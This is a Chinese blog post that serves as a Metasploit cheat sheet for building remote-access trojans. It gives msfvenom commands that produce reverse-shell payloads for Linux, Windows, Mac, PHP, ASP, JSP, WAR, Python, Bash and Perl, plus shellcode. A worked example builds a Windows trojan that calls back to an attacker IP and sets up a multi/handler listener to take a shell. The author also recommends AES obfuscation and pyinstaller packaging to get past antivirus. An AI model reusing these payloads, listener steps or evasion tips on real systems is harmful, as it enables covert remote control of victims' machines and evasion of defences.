<!DOCTYPE html><html data-theme="light"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5"><title>msfvenom生成各类Payload命令，远程木马攻击 | Directoree</title><meta name="description" content="msfvenom生成各类Payload命令，远程木马攻击"><meta name="keywords" content="msfvenom,远程木马攻击"><meta name="author" content="Directoree"><meta name="copyright" content="Directoree"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="msfvenom生成各类Payload命令，远程木马攻击"><meta name="twitter:description" content="msfvenom生成各类Payload命令，远程木马攻击"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/top_img/default.png"><meta property="og:type" content="article"><meta property="og:title" content="msfvenom生成各类Payload命令，远程木马攻击"><meta property="og:url" content="https://Directoree.github.io/post/Metasploit1/"><meta property="og:site_name" content="Directoree"><meta property="og:description" content="msfvenom生成各类Payload命令，远程木马攻击"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/top_img/default.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = 'true'
var t = Cookies.get("theme");
if (autoChangeMode == '1'){
const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

if (t === undefined){
  if (isLightMode) activateLightMode()
  else if (isDarkMode) activateDarkMode()
  else if (isNotSpecified || hasNoSupport){
    console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
    now = new Date();
    hour = now.getHours();
    isNight = hour < 6 || hour >= 18
    isNight ? activateDarkMode() : activateLightMode()
}
} else if (t == 'light') activateLightMode()
else activateDarkMode()


} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="https://Directoree.github.io/post/Metasploit1/"><link rel="prev" title="Hexo+Github博客搭建终极大法" href="https://Directoree.github.io/post/createGithubblog/"><link rel="next" title="Hello World" href="https://Directoree.github.io/post/hello-world/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  bookmark: {
    title: 'Snackbar.bookmark.title',
    message_prev: 'Press',
    message_next: 'to bookmark this page'
  },
  runtime_unit: 'days',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: false,
  isHome: false,
  isPost: true
  
}</script><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><header> <div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">Directoree</a></span><span class="toggle-menu pull_right close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 清单</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div></span><span class="pull_right" id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> Search</span></a></span></div></header><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">78</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">Tags</div><div class="length_num">42</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">Categories</div><div class="length_num">26</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 清单</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div></div><div id="mobile-sidebar-toc"><div class="toc_mobile_headline">Catalog</div><div class="sidebar-toc__content"><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#msfvenom生成各类Payload命令"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">   msfvenom生成各类Payload命令</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#Linux"><span class="toc_mobile_items-number">1.1.</span> <span class="toc_mobile_items-text">Linux</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#Windows"><span class="toc_mobile_items-number">1.2.</span> <span class="toc_mobile_items-text">Windows</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#Mac"><span class="toc_mobile_items-number">1.3.</span> <span class="toc_mobile_items-text">Mac</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#PHP"><span class="toc_mobile_items-number">1.4.</span> <span class="toc_mobile_items-text">PHP</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#ASP"><span class="toc_mobile_items-number">1.5.</span> <span class="toc_mobile_items-text">ASP</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#JSP"><span class="toc_mobile_items-number">1.6.</span> <span class="toc_mobile_items-text">JSP</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#WAR"><span class="toc_mobile_items-number">1.7.</span> <span class="toc_mobile_items-text">WAR</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#Python"><span class="toc_mobile_items-number">1.8.</span> <span class="toc_mobile_items-text">Python</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#Bash"><span class="toc_mobile_items-number">1.9.</span> <span class="toc_mobile_items-text">Bash</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#Perl"><span class="toc_mobile_items-number">1.10.</span> <span class="toc_mobile_items-text">Perl</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#Shellcode"><span class="toc_mobile_items-number">1.11.</span> <span class="toc_mobile_items-text">Shellcode</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#Linux-Based-Shellcode"><span class="toc_mobile_items-number">1.12.</span> <span class="toc_mobile_items-text">Linux Based Shellcode</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#Windows-Based-Shellcode"><span class="toc_mobile_items-number">1.13.</span> <span class="toc_mobile_items-text">Windows Based Shellcode</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#Mac-Based-Shellcode"><span class="toc_mobile_items-number">1.14.</span> <span class="toc_mobile_items-text">Mac Based Shellcode</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#Handlers模块"><span class="toc_mobile_items-number">1.15.</span> <span class="toc_mobile_items-text">Handlers模块</span></a></li></ol></li></ol></div></div></div><div id="body-wrap"><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true">     </i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#msfvenom生成各类Payload命令"><span class="toc-number">1.</span> <span class="toc-text">   msfvenom生成各类Payload命令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Linux"><span class="toc-number">1.1.</span> <span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Windows"><span class="toc-number">1.2.</span> <span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Mac"><span class="toc-number">1.3.</span> <span class="toc-text">Mac</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP"><span class="toc-number">1.4.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ASP"><span class="toc-number">1.5.</span> <span class="toc-text">ASP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JSP"><span class="toc-number">1.6.</span> <span class="toc-text">JSP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WAR"><span class="toc-number">1.7.</span> <span class="toc-text">WAR</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Python"><span class="toc-number">1.8.</span> <span class="toc-text">Python</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Bash"><span class="toc-number">1.9.</span> <span class="toc-text">Bash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Perl"><span class="toc-number">1.10.</span> <span class="toc-text">Perl</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Shellcode"><span class="toc-number">1.11.</span> <span class="toc-text">Shellcode</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Linux-Based-Shellcode"><span class="toc-number">1.12.</span> <span class="toc-text">Linux Based Shellcode</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Windows-Based-Shellcode"><span class="toc-number">1.13.</span> <span class="toc-text">Windows Based Shellcode</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Mac-Based-Shellcode"><span class="toc-number">1.14.</span> <span class="toc-text">Mac Based Shellcode</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Handlers模块"><span class="toc-number">1.15.</span> <span class="toc-text">Handlers模块</span></a></li></ol></li></ol></div></div></div><main id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/top_img/default.png)"><div id="post-info"><div id="post-title"><div class="posttitle">msfvenom生成各类Payload命令，远程木马攻击</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> Created 2018-11-14<span class="post-meta__separator">|</span><i class="fa fa-history fa-fw" aria-hidden="true"></i> Updated 2018-12-24</time><span class="post-meta__separator">|</span><span><i class="fa fa-inbox post-meta__icon fa-fw" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Metasploit/">Metasploit</a></span><div class="post-meta-wordcount"><div class="post-meta-pv-cv"><span><i class="fa fa-eye post-meta__icon fa-fw" aria-hidden="true"> </i>Post View:</span><span id="busuanzi_value_page_pv"></span></div></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><h4 id="msfvenom生成各类Payload命令"><a href="#msfvenom生成各类Payload命令" class="headerlink" title="   msfvenom生成各类Payload命令"></a><font face="Arial">   msfvenom生成各类Payload命令</font></h4><blockquote>
<p><font face="Arial">Often one of the most useful(and to the beginner underrated) abilities of Metasploit is the  msfpayload module. Multiple payloads can be created with this module and it helps something that can give you a shell in almost any situation. For each of these payloads you can go into msfconsole and select exploit/multi/handler. Run ‘set payload’ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for the payload to be run. For the examples below it’s pretty self explanatory but LHOST should be filled in with your IP address(LAN IP if  attacking within the network, WAN IP if attacking across the internet), and LPORT should be the port you wish to be connected back on.</font></p>
</blockquote>
<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><p><font face="Arial">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f elf &gt; shell.elf</your></your></font></p>
<h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><p><font face="Arial">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f exe &gt; shell.exe</your></your></font></p>
<h5 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h5><p><font face="Arial">msfvenom -p osx/x86/shell_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f macho &gt; shell.macho</your></your></font></p>
<h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><p><font face="Arial">msfvenom -p php/meterpreter_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.php</your></your></font></p>
<p><font face="Arial">cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</font></p>
<h5 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h5><p><font face="Arial">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f asp &gt; shell.asp</your></your></font></p>
<h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><p><font face="Arial">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.jsp</your></your></font></p>
<h5 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h5><p><font face="Arial">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f war &gt; shell.war                    Scripting Payloads</your></your></font></p>
<h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><p><font face="Arial">msfvenom -p cmd/unix/reverse_python LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.py</your></your></font></p>
<h5 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h5><p><font face="Arial">msfvenom -p cmd/unix/reverse_bash LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.sh</your></your></font></p>
<h5 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h5><p><font face="Arial">msfvenom -p cmd/unix/reverse_perl LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.pl</your></your></font></p>
<h5 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h5><p><font face="Arial">For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</font></p>
<h5 id="Linux-Based-Shellcode"><a href="#Linux-Based-Shellcode" class="headerlink" title="Linux Based Shellcode"></a>Linux Based Shellcode</h5><p><font face="Arial">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f <language></language></your></your></font></p>
<h5 id="Windows-Based-Shellcode"><a href="#Windows-Based-Shellcode" class="headerlink" title="Windows Based Shellcode"></a>Windows Based Shellcode</h5><p>Your IP Address&gt; LPORT=<your port to connect on> -f  language    “language放在&lt;&gt;里”<br></your></p>
<h5 id="Mac-Based-Shellcode"><a href="#Mac-Based-Shellcode" class="headerlink" title="Mac Based Shellcode"></a>Mac Based Shellcode</h5><p><font face="Arial">msfvenom -p osx/x86/shell_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f <language></language></your></your></font></p>
<h5 id="Handlers模块"><a href="#Handlers模块" class="headerlink" title="Handlers模块"></a><font face="Arial">Handlers模块</font></h5><p>Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.</p>
<blockquote>
<p><font face="Arial">use exploit/multi/handler</font><br> <font face="Arial">set LHOST <lhost value></lhost></font><br> <font face="Arial">set LPORT <lport value></lport></font><br> <font face="Arial">exploit -j -z</font><br> <font face="Arial">Once the required values are completed the following command will </font>execute your handler – ‘msfconsole -L -r ‘</p>
</blockquote>
<hr>
<p>&nbsp;<br>&nbsp;<br><strong>下面以一个实例说明使用方法</strong></p>
<p>Metasploit之我的远程控制软件<br>参考文献：<a href="http://www.evil0x.com/posts/838.html" target="_blank" rel="noopener">Metasploit渗透测试笔记(Meterpreter篇</a></p>
<p>远程控制软件–&gt;远控后门木马程序</p>
<p>木马程序–&gt;控制端（攻击者）–&gt;服务端（攻击目标）</p>
<p>测试环境：<br>攻击者：kali-linux    –&gt;192.168.2.146<br>受害者：Windows07     –&gt;192.168.2.107</p>
<p>以下为kali-linux-2.0系统下的生成与连接方式（使用msfvenom命令的）<br><a href="http://www.77169.com/hack/201602/224112.shtm" target="_blank" rel="noopener">参考文献一</a><br><a href="http://www.i0day.com/1173.html" target="_blank" rel="noopener">类似文献二</a></p>
<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的ip LPORT=你的端口 -f exe -o payload.exe</p>
<p>以上就是基本命令，解释一下，-p后面是payload名称，然后是你的ip和端口(payload参数)，然后是-f 格式，由于是实验就先设置exe，然后-o payload.exe指保存为payload.exe。当然，实验的时候可以把格式设置成exe，但是实战的时候毕竟有杀毒软件，所以格式最好是jar，jar就要求对方有java环境，可以用来拿java web网站的时候使用，或者设置成python然后自行shellcode免杀，即用Python容器，然后用AES混淆Python代码，再用pyinstaller编译exe，这是目前最完美的过杀毒软件方案，就连勒索软件都不会被杀毒软件干掉，除非有特殊动作，比如修改注册表。当然，楼主还有很多要学习。</p>
<p>具体步骤如下：</p>
<pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>192.168.2.146 LPORT<span class="token operator">=</span>44444 -f exe -o test.exe            <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>–&gt;在当前目录下生成木马程序test.exe，PS：生成payload.exe不会被杀，test.exe被秒杀</p>
<p>PS:之后的操作步骤是和上面的一样的↓</p>
<p>之后在metasploit下连接后门程序，步骤如下：</p>
<pre class="line-numbers language-bash"><code class="language-bash">msfconsole                  --<span class="token operator">></span>开启metasploit
use exploit/multi/handler       --<span class="token operator">></span>使用“exploit/multi/handler”这个模块连接后门程序
show options   --<span class="token operator">></span>查看需要设置的配置信息//这里其实不需要配置任何信息的
<span class="token keyword">set</span> PAYLOAD windows/meterpreter/reverse_tcp    --<span class="token operator">></span>使用tcp反向连接
show options               --<span class="token operator">></span>查看需要设置的配置信息
<span class="token keyword">set</span> LHOST<span class="token operator">=</span>192.168.2.146    --<span class="token operator">></span>设置我们攻击者自己的连接IP
<span class="token keyword">set</span> LPORT<span class="token operator">=</span>44444            --<span class="token operator">></span>设置我们攻击浙自己的连接端口
exploit                    --<span class="token operator">></span>执行连接，等待木马执行后连接<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>PS：远程木马被执行后接着可以直接“shell”命令拿下shell</p>
<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>OK，完成了！<br>&nbsp;<br>&nbsp;</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Directoree</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://Directoree.github.io/post/Metasploit1/">https://Directoree.github.io/post/Metasploit1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/msfvenom/">msfvenom    </a><a class="post-meta__tags" href="/tags/远程木马攻击/">远程木马攻击    </a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/top_img/default.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> Donate<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/wechat.jpg" alt="微信"><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/alipay.jpg" alt="支付寶"><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/post/createGithubblog/"><img class="prev_cover lazyload" data-src="https://i.loli.net/2018/12/24/5c20d00794e53.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">Previous Post</div><div class="prev_info"><span>Hexo+Github博客搭建终极大法</span></div></a></div><div class="next-post pull_right"><a href="/post/hello-world/"><img class="next_cover lazyload" data-src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/top_img/default.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">Next Post</div><div class="next_info"><span>Hello World</span></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> Recommend</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/post/Metasploit3/" title="Metasploit之渗透安卓实战"><img class="relatedPosts_cover lazyload" data-src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/top_img/default.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-01-06</div><div class="relatedPosts_title">Metasploit之渗透安卓实战</div></div></a></div><div class="relatedPosts_item"><a href="/post/Metasploit2/" title="Metasploit工具Meterpreter的命令速查表"><img class="relatedPosts_cover lazyload" data-src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/top_img/default.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-01-06</div><div class="relatedPosts_title">Metasploit工具Meterpreter的命令速查表</div></div></a></div></div><div class="clear_both"></div></div></div></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2018 - 2020 By Directoree</div><div class="framework-info"><span>Driven </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="Read Mode"></i><i class="fa fa-plus" id="font_plus" title="Increase font size"></i><i class="fa fa-minus" id="font_minus" title="Decrease font size"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="Traditional Chinese and Simplified Chinese Conversion" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="Dark Mode"></i></div><div id="rightside-config-show"><div id="rightside_config" title="Setting"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="Table of Contents" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="Back to top" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async></script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>